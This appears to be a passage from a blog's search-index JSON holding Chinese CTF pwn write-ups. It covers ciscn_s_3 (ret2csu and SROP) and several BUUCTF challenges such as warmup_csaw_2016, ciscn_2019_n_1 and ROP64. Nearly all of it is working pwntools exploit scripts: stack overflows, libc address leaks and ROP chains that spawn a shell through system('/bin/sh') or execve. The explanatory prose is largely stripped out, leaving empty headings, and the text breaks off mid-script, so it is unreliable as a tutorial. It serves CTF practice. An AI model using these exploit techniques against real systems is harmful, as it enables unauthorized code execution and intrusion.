remote(<span class=\"string\">\"node3.buuoj.cn\"</span>,<span class=\"number\">28985</span>)</span><br><span class=\"line\">elf = ELF(<span class=\"string\">'./ciscn_s_3'</span>)</span><br><span class=\"line\">vuln_addr=<span class=\"number\">0x4004ED</span></span><br><span class=\"line\">mov_rax_execv_addr=<span class=\"number\">0x4004E2</span>   </span><br><span class=\"line\">pop_rdi_ret_addr=<span class=\"number\">0x4005a3</span>  </span><br><span class=\"line\">pop_rbx_rbp_r12_r13_r14_r15_ret_addr=<span class=\"number\">0x40059A</span></span><br><span class=\"line\">__libc_csu_init_addr=<span class=\"number\">0x400580</span>  <span class=\"comment\"># __libc_csu_init gadget </span></span><br><span class=\"line\">syscall_addr=<span class=\"number\">0x400501</span>             <span class=\"comment\">#ida</span></span><br><span class=\"line\"></span><br><span class=\"line\">payload1=<span class=\"string\">'/bin/sh\\x00'</span>*<span class=\"number\">2</span>+p64(vuln_addr)</span><br><span class=\"line\">sl(payload1)</span><br><span class=\"line\">r(<span class=\"number\">0x20</span>)</span><br><span class=\"line\">bin_sh_addr=uu64(r(<span class=\"number\">8</span>))<span class=\"number\">-280</span></span><br><span class=\"line\">leak(<span class=\"string\">\"/bin/sh\"</span>,bin_sh_addr)</span><br><span class=\"line\">payload2=<span class=\"string\">'/bin/sh\\x00'</span>*<span class=\"number\">2</span>+p64(pop_rbx_rbp_r12_r13_r14_r15_ret_addr)+p64(<span class=\"number\">0</span>)*<span class=\"number\">2</span>+p64(bin_sh_addr+<span class=\"number\">0x50</span>)+p64(<span class=\"number\">0</span>)*<span class=\"number\">3</span></span><br><span class=\"line\">print(hex(bin_sh_addr+<span class=\"number\">0x50</span>))</span><br><span class=\"line\">payload2+=p64(__libc_csu_init_addr)+p64(mov_rax_execv_addr)</span><br><span class=\"line\">payload2+=p64(pop_rdi_ret_addr)+p64(bin_sh_addr)+p64(syscall_addr) </span><br><span class=\"line\">sl(payload2)</span><br><span class=\"line\">itr()</span><br></pre></td></tr></table></figure>\n<p><strong>ret2__libc_csu_init()</strong></p>\n<h2 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h2><p>SROP</p>\n<h3 id=\"SROP\"><a href=\"#SROP\" class=\"headerlink\" title=\"SROP\"></a>SROP</h3><p>SROPROP</p>\n<p>SROPsigreturngadgetsigcontext</p>\n<h3 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a><strong></strong></h3><p><strong>signal</strong></p>\n<p>signalsignal handler</p>\n<p>signal handler</p>\n<ol>\n<li>signal frameframesignal</li>\n<li>sigreturn</li>\n<li>signal handler signal handlersignal</li>\n<li>signal handlersigreturn</li>\n<li>sigreturnsignal frame</li>\n<li></li>\n</ol>\n<p><img src=\"/2021/02/14/%E4%B8%80%E9%81%93%E6%A0%88%E9%A2%98/image-20210214203411860.png\" alt=\"image-20210214203411860\"></p>\n<blockquote>\n<p> ucontext  siginfo  Signal Frame</p>\n<p>32  sigreturn  7764  15</p>\n</blockquote>\n<h3 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h3><p>sigreturnsignal</p>\n<p>sigreturn</p>\n<p></p>\n<p><img src=\"/2021/02/14/%E4%B8%80%E9%81%93%E6%A0%88%E9%A2%98/image-20210214203929462.png\" alt=\"image-20210214203929462\"></p>\n<p><strong></strong></p>\n<p><img src=\"/2021/02/14/%E4%B8%80%E9%81%93%E6%A0%88%E9%A2%98/image-20210215144016291.png\" alt=\"image-20210215144016291\"></p>\n<p> ROP </p>\n<ul>\n<li><strong></strong></li>\n<li><ul>\n<li><strong>/bin/sh</strong></li>\n<li><strong>Signal Frame</strong></li>\n<li><strong>syscall</strong></li>\n<li><strong>sigreturn</strong></li>\n</ul>\n</li>\n<li> sigal frame</li>\n</ul>\n<p></p>\n<p>syscall sigreturn </p>\n<p>bin/sh/bin/sh</p>\n<p></p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">p = remote(<span class=\"string\">\"node3.buuoj.cn\"</span>,<span class=\"number\">29158</span>)</span><br><span class=\"line\">elf = ELF(<span class=\"string\">'./ciscn_s_3'</span>)</span><br><span class=\"line\">context.arch = elf.arch</span><br><span class=\"line\"></span><br><span class=\"line\">pop_rdi_ret = <span class=\"number\">0x04005a3</span></span><br><span class=\"line\">syscall = <span class=\"number\">0x0000000000400501</span></span><br><span class=\"line\">main_addr = elf.symbols[<span class=\"string\">'main'</span>]</span><br><span class=\"line\">vuln_addr = <span class=\"number\">0x4004ED</span></span><br><span class=\"line\">sigreturn = <span class=\"number\">0x04004DA</span></span><br><span class=\"line\"></span><br><span class=\"line\">payload1 = <span class=\"string\">\"/bin/sh\\x00/bin/sh\\x00\"</span> + p64(vuln_addr)</span><br><span class=\"line\">sl(payload1)</span><br><span class=\"line\">print(r(<span class=\"number\">0x20</span>))</span><br><span class=\"line\">binsh = u64(r(<span class=\"number\">8</span>)) - <span class=\"number\">0x118</span></span><br><span class=\"line\">leak(<span class=\"string\">\"/bin/sh\"</span>,binsh)</span><br><span class=\"line\">r(<span class=\"number\">8</span>)</span><br><span class=\"line\">sigframe = SigreturnFrame()</span><br><span class=\"line\">sigframe.rax = constants.SYS_execve</span><br><span class=\"line\">sigframe.rdi = binsh</span><br><span class=\"line\">sigframe.rsi = <span class=\"number\">0</span></span><br><span class=\"line\">sigframe.rdx = <span class=\"number\">0</span></span><br><span class=\"line\">sigframe.rip = syscall</span><br><span class=\"line\">payload = <span class=\"string\">\"/bin/sh\\x00/bin/sh\\x00\"</span> + p64(sigreturn) + p64(syscall) + str(sigframe)</span><br><span class=\"line\">sl(payload)</span><br><span class=\"line\">itr()</span><br></pre></td></tr></table></figure>\n<blockquote>\n<p>pwntoolssigreturn</p>\n</blockquote>\n","categories":[],"tags":["PWN"]},{"title":"BUU(PWN1)---","url":"https://pz1o.top/2021/01/23/BUU-PWN/","content":"<p></p>\n<h1 id=\"BUU\"><a href=\"#BUU\" class=\"headerlink\" title=\"BUU\"></a>BUU</h1><h2 id=\"warmup-csaw-2016\"><a href=\"#warmup-csaw-2016\" class=\"headerlink\" title=\"warmup_csaw_2016\"></a>warmup_csaw_2016</h2><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#!/usr/bin/env python</span></span><br><span class=\"line\"><span class=\"comment\"># -*- coding:utf-8 -*-</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"comment\">#node3.buuoj.cn:28301</span></span><br><span class=\"line\">r = remote(<span class=\"string\">\"node3.buuoj.cn\"</span>,<span class=\"number\">28301</span>)</span><br><span class=\"line\"><span class=\"comment\">#r = process(\"\")</span></span><br><span class=\"line\"></span><br><span class=\"line\">payload = <span class=\"string\">b'A'</span>*(<span class=\"number\">0x40</span>+<span class=\"number\">0x8</span>) + p64(<span class=\"number\">0x40060d</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">r.sendline(payload)</span><br><span class=\"line\">r.interactive()</span><br></pre></td></tr></table></figure>\n<h2 id=\"pwn1-sctf-2016\"><a href=\"#pwn1-sctf-2016\" class=\"headerlink\" title=\"pwn1_sctf_2016\"></a>pwn1_sctf_2016</h2><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#!/usr/bin/env python</span></span><br><span class=\"line\"><span class=\"comment\"># -*- coding:utf-8 -*-</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"></span><br><span class=\"line\">r = remote(<span class=\"string\">\"node3.buuoj.cn\"</span>,<span class=\"number\">28698</span>)</span><br><span class=\"line\"><span class=\"comment\">#r = process(\"./pwn1_sctf_2016\")</span></span><br><span class=\"line\"></span><br><span class=\"line\">payload = <span class=\"string\">b'I'</span>*<span class=\"number\">20</span> + <span class=\"string\">b'A'</span>*<span class=\"number\">0x4</span> + p32(<span class=\"number\">0x08048F0D</span>)</span><br><span class=\"line\">r.sendline(payload)</span><br><span class=\"line\">r.interactive()</span><br></pre></td></tr></table></figure>\n<h2 id=\"ciscn-2019-n-1\"><a href=\"#ciscn-2019-n-1\" class=\"headerlink\" title=\"ciscn_2019_n_1\"></a>ciscn_2019_n_1</h2><p></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#include&lt;stdio.h&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">int main()</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\tfloat a &#x3D; 11.28125;</span><br><span class=\"line\">\tunsigned char* p &#x3D;  (unsigned char*)&amp;a;</span><br><span class=\"line\">\tprintf(&quot;0x%x %x %x %x&quot;,*(p+3),*(p+2),*(p+1),*(p));</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#!/usr/bin/env python</span></span><br><span class=\"line\"><span class=\"comment\"># -*- coding:utf-8 -*-</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#r = remote(\"\")</span></span><br><span class=\"line\">r = remote(<span class=\"string\">\"node3.buuoj.cn\"</span>,<span class=\"number\">29611</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">payload = <span class=\"string\">'A'</span>*(<span class=\"number\">0x2c</span>) + <span class=\"string\">\"\\x00\\x80\\x34\\x41\"</span></span><br><span class=\"line\"></span><br><span class=\"line\">r.sendline(payload)</span><br><span class=\"line\"></span><br><span class=\"line\">r.interactive()</span><br></pre></td></tr></table></figure>\n<h2 id=\"-CTFPWN-stack\"><a href=\"#-CTFPWN-stack\" class=\"headerlink\" title=\"[ CTFPWN]stack\"></a>[ CTFPWN]stack</h2><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#!/usr/bin/env python</span></span><br><span class=\"line\"><span class=\"comment\"># -*- coding:utf-8 -*-</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"></span><br><span class=\"line\">r = remote(<span class=\"string\">\"node3.buuoj.cn\"</span>,<span class=\"number\">26846</span>)</span><br><span class=\"line\"><span class=\"comment\">#r = process(\"./stack\")</span></span><br><span class=\"line\"></span><br><span class=\"line\">payload = <span class=\"string\">b'A'</span>*(<span class=\"number\">0xA</span>+<span class=\"number\">0x8</span>) + p64(<span class=\"number\">0x400537</span>)</span><br><span class=\"line\">r.sendline(payload)</span><br><span class=\"line\">r.interactive()</span><br></pre></td></tr></table></figure>\n<h2 id=\"-CTFPWN-ROP64\"><a href=\"#-CTFPWN-ROP64\" class=\"headerlink\" title=\"[ CTFPWN]ROP64\"></a>[ CTFPWN]ROP64</h2><p>64</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">from pwn import *</span><br><span class=\"line\">p&#x3D;process(&#39;.&#x2F;rop&#39;)</span><br><span class=\"line\">elf&#x3D;ELF(&#39;.&#x2F;rop&#39;)</span><br><span class=\"line\">libc &#x3D; elf.libc</span><br><span class=\"line\">pop_rdi &#x3D; 0x4005d3</span><br><span class=\"line\">puts_got &#x3D; 0x601018</span><br><span class=\"line\">puts &#x3D; 0x400430</span><br><span class=\"line\">main &#x3D; 0x400537</span><br><span class=\"line\">rop1 &#x3D; &quot;a&quot;*18</span><br><span class=\"line\">rop1 +&#x3D; p64(pop_rdi)</span><br><span class=\"line\">rop1 +&#x3D; p64(puts_got)</span><br><span class=\"line\">rop1 +&#x3D; p64(puts)</span><br><span class=\"line\">rop1 +&#x3D; p64(main)</span><br><span class=\"line\">p.sendline(rop1)</span><br><span class=\"line\">p.recvuntil(&#39;\\n&#39;)</span><br><span class=\"line\">addr &#x3D; u64(p.recv(6).ljust(8,&#39;\\x00&#39;))</span><br><span class=\"line\">libc_base &#x3D; addr - libc.symbols[&#39;puts&#39;]</span><br><span class=\"line\">info(&quot;libc:0x%x&quot;,libc_base)</span><br><span class=\"line\">pop_rax &#x3D; 0x00000000000439c8 + libc_base</span><br><span class=\"line\">pop_rdi &#x3D; 0x000000000002155f + libc_base</span><br><span class=\"line\">pop_rsi &#x3D; 0x0000000000023e6a + libc_base</span><br><span class=\"line\">pop_rdx &#x3D; 0x0000000000001b96 + libc_base</span><br><span class=\"line\">syscall &#x3D; 0x00000000000d2975 + libc_base</span><br><span class=\"line\">binsh   &#x3D; next(libc.search(&quot;&#x2F;bin&#x2F;sh&quot;),) + libc_base</span><br><span class=\"line\">rop2 &#x3D; &quot;a&quot;*18</span><br><span class=\"line\">rop2 +&#x3D; p64(pop_rax)</span><br><span class=\"line\">rop2 +&#x3D; p64(59)</span><br><span class=\"line\">rop2 +&#x3D; p64(pop_rdi)</span><br><span class=\"line\">rop2 +&#x3D; p64(binsh)</span><br><span class=\"line\">rop2 +&#x3D; p64(pop_rsi)</span><br><span class=\"line\">rop2 +&#x3D; p64(0)</span><br><span class=\"line\">rop2 +&#x3D; p64(pop_rdx)</span><br><span class=\"line\">rop2 +&#x3D; p64(0)</span><br><span class=\"line\">rop2 +&#x3D; p64(syscall)</span><br><span class=\"line\"> </span><br><span class=\"line\">p.recvuntil(&quot;hello\\n&quot;)</span><br><span class=\"line\">p.sendline(rop2)</span><br><span class=\"line\">p.interactive()</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">p &#x3D; remote(&quot;node3.buuoj.cn&quot;,28426)</span><br><span class=\"line\">libc &#x3D; ELF(&quot;.&#x2F;libc-2.271.so&quot;)</span><br><span class=\"line\">#p &#x3D; process(&quot;.&#x2F;rop&quot;)</span><br><span class=\"line\">puts_plt &#x3D; elf.symbols[&quot;puts&quot;]</span><br><span class=\"line\">pop_rdi &#x3D; 0x4005d3</span><br><span class=\"line\">ret &#x3D; 0x400416</span><br><span class=\"line\">puts_got &#x3D; elf.got[&quot;puts&quot;]</span><br><span class=\"line\">ru(&#39;hello\\n&#39;)</span><br><span class=\"line\">payload &#x3D; b&#39;A&#39;*(0xa+0x8) + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(0x400537)</span><br><span class=\"line\">sl(payload)</span><br><span class=\"line\">puts &#x3D; u64(p.recv(6).ljust(8, &#39;\\x00&#39;))</span><br><span class=\"line\">leak(&quot;puts&quot;,puts)</span><br><span class=\"line\">libc_base &#x3D; puts-libc.symbols[&#39;puts&#39;]</span><br><span class=\"line\">sys &#x3D; libc_base + libc.symbols[&#39;system&#39;]</span><br><span class=\"line\">bin_sh &#x3D; libc_base + next(libc.search(&quot;&#x2F;bin&#x2F;sh&quot;))</span><br><span class=\"line\"># libc &#x3D; LibcSearcher(&quot;puts&quot;,puts)</span><br><span class=\"line\"># libc_base &#x3D; puts - libc.dump(&quot;puts&quot;)</span><br><span class=\"line\"># sys &#x3D; libc_base + libc.dump(&quot;system&quot;)</span><br><span class=\"line\"># bin_sh &#x3D; libc_base + libc.dump(&quot;str_bin_sh&quot;)</span><br><span class=\"line\">#gdb.attach(p)</span><br><span class=\"line\">payload &#x3D; b&#39;A&#39;*(0xa+0x8) + p64(pop_rdi) + p64(bin_sh) +p64(ret)+ p64(sys)</span><br><span class=\"line\">leak(&quot;libc_base&quot;,libc_base)</span><br><span class=\"line\"># pop_rax &#x3D; 0x00000000000439c8 + libc_base</span><br><span class=\"line\"># pop_rdi &#x3D; 0x000000000002155f + libc_base</span><br><span class=\"line\"># pop_rsi &#x3D; 0x0000000000023e6a + libc_base</span><br><span class=\"line\"># pop_rdx &#x3D; 0x0000000000001b96 + libc_base</span><br><span class=\"line\"># syscall &#x3D; 0x00000000000d2975 + libc_base</span><br><span class=\"line\"># payload &#x3D; b&#39;A&#39;*(0xa+0x8) + p64(pop_rax) + p64(59) + p64(pop_rdi) + p64(bin_sh) + p64(pop_rsi) + p64(0) + p64(pop_rdx) + p64(0) + p64(syscall)</span><br><span class=\"line\">sl(payload)</span><br><span class=\"line\">itr()</span><br></pre></td></tr></table></figure>\n<h2 id=\"jarvisoj-level0\"><a href=\"#jarvisoj-level0\" class=\"headerlink\" title=\"jarvisoj_level0\"></a>jarvisoj_level0</h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#!&#x2F;usr&#x2F;bin&#x2F;env python</span><br><span class=\"line\"># -*- coding:utf-8 -*-</span><br><span class=\"line\"></span><br><span class=\"line\">from pwn import *</span><br><span class=\"line\"></span><br><span class=\"line\">#r &#x3D; remote(&quot;&quot;)</span><br><span class=\"line\">r &#x3D; remote(&quot;node3.buuoj.cn&quot;,29477)</span><br><span class=\"line\"></span><br><span class=\"line\">payload &#x3D; &#39;A&#39;*(0x88) + p64(0x400596)</span><br><span class=\"line\"></span><br><span class=\"line\">r.sendline(payload)</span><br><span class=\"line\"></span><br><span class=\"line\">r.interactive()</span><br></pre></td></tr></table></figure>\n<h2 id=\"ciscn-2019-c-164puts\"><a href=\"#ciscn-2019-c-164puts\" class=\"headerlink\" title=\"ciscn_2019_c_164puts\"></a>ciscn_2019_c_164puts</h2><p></p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#!/usr/bin/env python</span></span><br><span class=\"line\"><span class=\"comment\"># -*- coding:utf-8 -*-</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#r = remote(\"\")</span></span><br><span class=\"line\">p = remote(<span class=\"string\">\"node3.buuoj.cn\"</span>,<span class=\"number\">29957</span>)</span><br><span class=\"line\">p = process(<span class=\"string\">\"./pwn3\"</span>)</span><br><span class=\"line\">elf = ELF(<span class=\"string\">\"./pwn3\"</span>)</span><br><span class=\"line\">libc = ELF(<span class=\"string\">'/lib/x86_64-linux-gnu/libc-2.23.so'</span>)</span><br><span class=\"line\">puts_addr = elf.symbols[<span class=\"string\">\"puts\"</span>]</span><br><span class=\"line\">puts_got = elf.got[<span class=\"string\">\"puts\"</span>]</span><br><span class=\"line\">encrypt = <span class=\"number\">0x4009a0</span></span><br><span class=\"line\">pop_rdi = <span class=\"number\">0x400c83</span></span><br><span class=\"line\"></span><br><span class=\"line\">p.recvuntil(<span class=\"string\">\"Input your choice!\\n\"</span>)</span><br><span class=\"line\">p.sendline(<span class=\"string\">'1'</span>)</span><br><span class=\"line\">p.recvuntil(<span class=\"string\">\"Input your Plaintext to be encrypted\\n\"</span>)</span><br><span class=\"line\">payload = <span class=\"string\">b'A'</span>*<span class=\"number\">0x58</span>+p64(pop_rdi)+p64(puts_got)+p64(puts_addr)+p64(encrypt)</span><br><span class=\"line\">p.sendline(payload)</span><br><span class=\"line\">p.recvline()</span><br><span class=\"line\">p.recvline()</span><br><span class=\"line\">puts=u64(p.recv(<span class=\"number\">6</span>)+<span class=\"string\">'\\x00\\x00'</span>)</span><br><span class=\"line\">log.info(<span class=\"string\">\"libc base 0x%x\"</span>,puts-libc.symbols[<span class=\"string\">'puts'</span>])</span><br><span class=\"line\">libc_base = puts-libc.symbols[<span class=\"string\">'puts'</span>]</span><br><span class=\"line\">system_addr = libc_base + libc.symbols[<span class=\"string\">'system'</span>]</span><br><span class=\"line\">bin_sh_addr = libc_base + next(libc.search(<span class=\"string\">\"/bin/sh\"</span>))</span><br><span class=\"line\">print(next(libc.search(<span class=\"string\">\"/bin/sh\"</span>)))</span><br><span class=\"line\">payload2=<span class=\"string\">b'A'</span>*<span class=\"number\">0x58</span>+p64(pop_rdi)+p64(bin_sh_addr)+p64(system_addr)</span><br><span class=\"line\">p.sendline(payload2)</span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure>\n<p></p>\n<p>18</p>\n<p>libcsearcher</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#!/usr/bin/env python</span></span><br><span class=\"line\"><span class=\"comment\"># -*- coding:utf-8 -*-</span></span><br><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"keyword\">from</span> LibcSearcher <span class=\"keyword\">import</span> *</span><br><span class=\"line\"></span><br><span class=\"line\">context.os=<span class=\"string\">'linux'</span></span><br><span class=\"line\"><span class=\"comment\">#context.log_level='debug'</span></span><br><span class=\"line\"></span><br><span class=\"line\">ru=<span class=\"keyword\">lambda</span> x:p.recvuntil(x)</span><br><span class=\"line\">rl=<span class=\"keyword\">lambda</span> :p.recvline()</span><br><span class=\"line\">sl=<span class=\"keyword\">lambda</span> x:p.sendline(x)</span><br><span class=\"line\">sla=<span class=\"keyword\">lambda</span> x,y:p.sendlineafter(x,y)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#r = remote(\"\")</span></span><br><span class=\"line\">p = remote(<span class=\"string\">\"node3.buuoj.cn\"</span>,<span class=\"number\">27415</span>)</span><br><span class=\"line\"><span class=\"comment\">#p = process(\"./pwn3\")</span></span><br><span class=\"line\">elf = ELF(<span class=\"string\">\"./pwn3\"</span>)</span><br><span class=\"line\">libc = ELF(<span class=\"string\">'/lib/x86_64-linux-gnu/libc-2.23.so'</span>)</span><br><span class=\"line\">puts_plt = elf.symbols[<span class=\"string\">\"puts\"</span>]</span><br><span class=\"line\">puts_got = elf.got[<span class=\"string\">\"puts\"</span>]</span><br><span class=\"line\">encrypt = <span class=\"number\">0x4009a0</span></span><br><span class=\"line\">pop_rdi = <span class=\"number\">0x400c83</span></span><br><span class=\"line\">ret = <span class=\"number\">0x4006b9</span></span><br><span class=\"line\">payload = <span class=\"string\">b'A'</span>*<span class=\"number\">0x58</span>+p64(pop_rdi)+p64(puts_got)+p64(puts_plt)+p64(encrypt)</span><br><span class=\"line\">sla(<span class=\"string\">\"Input your choice!\\n\"</span>,<span class=\"string\">\"1\"</span>)</span><br><span class=\"line\">ru(<span class=\"string\">\"Input your Plaintext to be encrypted\\n\"</span>)</span><br><span class=\"line\">sl(payload)</span><br><span class=\"line\">rl()</span><br><span class=\"line\">rl()</span><br><span class=\"line\">puts = u64(ru(<span class=\"string\">'\\n'</span>)[:<span class=\"number\">-1</span>].ljust(<span class=\"number\">8</span>,<span class=\"string\">'\\0'</span>))</span><br><span class=\"line\">libc = LibcSearcher(<span class=\"string\">\"puts\"</span>,puts)</span><br><span class=\"line\">print(libc)</span><br><span class=\"line\">libc_base = puts-libc.dump(<span class=\"string\">\"puts\"</span>)</span><br><span class=\"line\">log.info(<span class=\"string\">\"libc base 0x%x\"</span>,libc_base)</span><br><span 